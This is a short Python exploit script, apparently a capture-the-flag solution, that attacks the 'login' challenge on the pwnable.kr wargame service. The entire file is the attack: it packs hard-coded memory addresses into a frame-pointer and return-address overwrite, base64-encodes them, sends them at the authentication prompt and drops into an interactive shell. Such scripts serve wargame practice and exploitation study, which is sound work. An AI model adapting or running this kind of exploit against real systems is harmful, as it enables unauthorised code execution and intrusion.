from zio import *
import base64
import struct

target = "./login"
target = ("pwnable.kr", 9003)

def get_io(target):
	io = zio(target, timeout = 9999)
	return io

def pwn(io):
	raw_input(":")
	io.read_until("Authenticate : ")
	ebpaddr = input_addr = struct.pack("I", 0x0811EB40)
	eip_addr = struct.pack("I", 0x08049278)
	shellcode = ebpaddr + eip_addr + input_addr
	buff = base64.encodestring(shellcode)
	io.write(buff + "\n")
	io.interact()

io = get_io(target)
pwn(io)